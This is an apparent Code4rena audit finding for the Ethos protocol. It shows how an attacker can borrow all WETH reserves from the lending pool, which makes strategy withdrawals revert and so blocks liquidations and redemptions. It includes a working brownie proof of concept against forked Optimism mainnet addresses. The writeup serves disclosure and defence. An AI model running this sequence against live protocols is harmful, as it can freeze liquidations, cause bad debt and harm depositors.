## Tags

- bug
- 2 (Med Risk)
- downgraded by judge
- judge review requested
- primary issue
- satisfactory
- selected for report
- M-06

# [Denial of liquidations and Redemptions by borrowing all reserves from AAVE](https://github.com/code-423n4/2023-02-ethos-findings/issues/693) 

# Lines of code

https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/ActivePool.sol#L239
https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Vault/contracts/ReaperStrategyGranarySupplyOnly.sol#L200


# Vulnerability details

### Impact

Liquidations and Redemptions can be prevented by making [`ActivePool._rebalance`](https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/ActivePool.sol#L239) revert by borrowing all collateral from AAVEs lendingPool.

The ActivePool will invest in the Vault, which will use the strategy to invest in the lending pool.

When withdrawing collateral, by Closing CDPs, Redeeming or Liquidating, [`_rebalance`](https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/ActivePool.sol#L174) will be called.

In most logical cases (high capital efficiency), this will trigger a [withdrawal from the Strategy](https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Vault/contracts/ReaperVaultV2.sol#L385) 

Which will trigger a [withdrawawal from the LendingPool](https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Vault/contracts/ReaperStrategyGranarySupplyOnly.sol#L200), 


An attacker can deny this operation [by borrowing all reserves from AAVE](https://medium.com/aave/understanding-the-risks-of-aave-43334dbfc6d0#:~:text=This%20situation%20can%20be%20problematic%20if%20depositors%20wish%20to%20withdraw%20their%20liquidity%2C%20but%20no%20funds%20are%20available.).


This will prevent all Liquidations, Redemptions as well as withdrawals, at will of the attacker.

This can be done to force the protocol to enter Recovery Mode, force re-absorptions and it can be pushed as far as to trigger bad debt.

Note that the attack can be performed maliciously without the need for a front-run, a sandwich (front-run + back-run) will just make it less costly (less interest paid) for the attacker but is not a way to prevent the attack.

### Preamble to the POC

Any time funds are pulled from the ActivePool, `_rebalance` is called.

We know that if a withdrawal is sizeable enough, `_rebalance` will trigger `Strategy._withdraw` which will attempt to `withdraw` from the lending pool.

The goal of the POC then is to show how we can make it impossible to perform a withdrawal, guaranteeing a revert on all calls to `_rebalance` which consequently will brick Redemptions and Liquidations

### POC

The POC is coded in brownie, I have setup a MockFile to be able to fork optimism, with the final addresses hardcoded in the strategy (Granary).

#### Goal of the POC

The goal of the POC is to demonstrate that withdrawals from the pool can be denied.

This shows how we can trigger a revert against `LendingPool.withdraw` which we know will cause `_rebalance` to revert as well

#### Coded POC

The following mock allows us to interact with the forked contracts

```solidity
// SPDX-License-Identifier: BUSL-1.1
pragma solidity ^0.8.0;

contract LendingPool {
  function deposit(
    address asset,
    uint256 amount,
    address onBehalfOf,
    uint16 referralCode
  ) external {}

  function borrow(
    address asset,
    uint256 amount,
    uint256 interestRateMode,
    uint16 referralCode,
    address onBehalfOf
  ) external {}

  function withdraw(
    address asset,
    uint256 amount,
    address to
  ) external {}
}
```

We can then fork optimism mainnet

```bash
brownie console --network optimism-main-fork
```

Run the following commands to show the attack

```python
## Setup addresses
lp = LendingPool.at("0x8FD4aF47E4E63d1D2D45582c3286b4BD9Bb95DfE")
a_token = interface.ERC20("0xfF94cc8E2c4B17e3CC65d7B83c7e8c643030D936")
weth = interface.ERC20("0x4200000000000000000000000000000000000006")
usdc = interface.ERC20("0x7F5c764cBc14f9669B88837ca1490cCa17c31607")

## Setup Actors
weth_whale = accounts.at("0xe50fa9b3c56ffb159cb0fca61f5c9d750e8128c8", force=True)
usdc_whale = accounts.at("0x625e7708f30ca75bfd92586e17077590c60eb4cd", force=True)

strategy = a[0]
exploiter = a[1]

## Fund Strategy with WETH
weth.transfer(strategy, 20e18, {"from": weth_whale})

## Strategy Deposits WETH
weth.approve(lp, 20e18, {"from": strategy})
lp.deposit(weth, 20e18, strategy, 0, {"from": strategy})


## Fund exploiter with USDC, they will borrow WETH
usdc.transfer(exploiter, usdc.balanceOf(usdc_whale), {"from": usdc_whale})

## Setup collateral so we can dry up WETH
usdc.approve(lp, usdc.balanceOf(exploiter), {"from": exploiter})
lp.deposit(usdc, usdc.balanceOf(exploiter), exploiter, 0, {"from": exploiter})

## Borrow Max, so no WETH is borrowable
to_borrow = weth.balanceOf(a_token)
lp.borrow(weth, to_borrow, 2, 0, exploiter, {"from": exploiter})

print(weth.balanceOf(a_token))
0 ## No weth left, next withdrawal will revert

## Strategy will not be able withdraw
to_withdraw = a_token.balanceOf(strategy)
assert to_withdraw > 0

## REVERTS HERE
lp.withdraw(weth, to_withdraw, strategy, {"from": strategy})

>>> Transaction sent: 0x2d129abc6f69d74db7567de54d9932ac406d2212c350ff7f16e66d3fb034e036
  Gas price: 0.0 gwei   Gas limit: 20000000   Nonce: 3
  LendingPool.withdraw confirmed (SafeMath: subtraction overflow)   Block: 79015780   Gas used: 138952 (0.69%)

```

Any time the Strategy needs to withdraw from the pool, because of `_rebalance` that withdrawal can be denied, which will consequently prevent Collateral from being pulled, which in turn will prevent Redemptions and Liquidations.

This means a overlevered malicious actor can bring down the peg of the system while preventing whichever liquidation or redemption they want


### Remediation Steps

I'm unclear as to a specific remediation, as AAVE, by design, will lend out all of it's reserves, meaning that the amount lent out should not be assumed as liquid.

Theoretically, re-balancing only manually should protect more assets, making the threshold for the attack higher.

However, any asset sent to the lending pool should be assumed illiquid, meaning that those amounts can be prevented from being withdrawable which will prevent Liquidations and Redemptions, potentially causing bad debt

### Additional Considerations

If LUSD is liquid enough to be shorted, a goal as you'd assume the token to scale, then the attack not only can be performed against the system unconditionally, but can also become profitable as the attacker can arbitrarily force bad debt for the entire portion of collateral in the lendingPool, profiting from the loss of value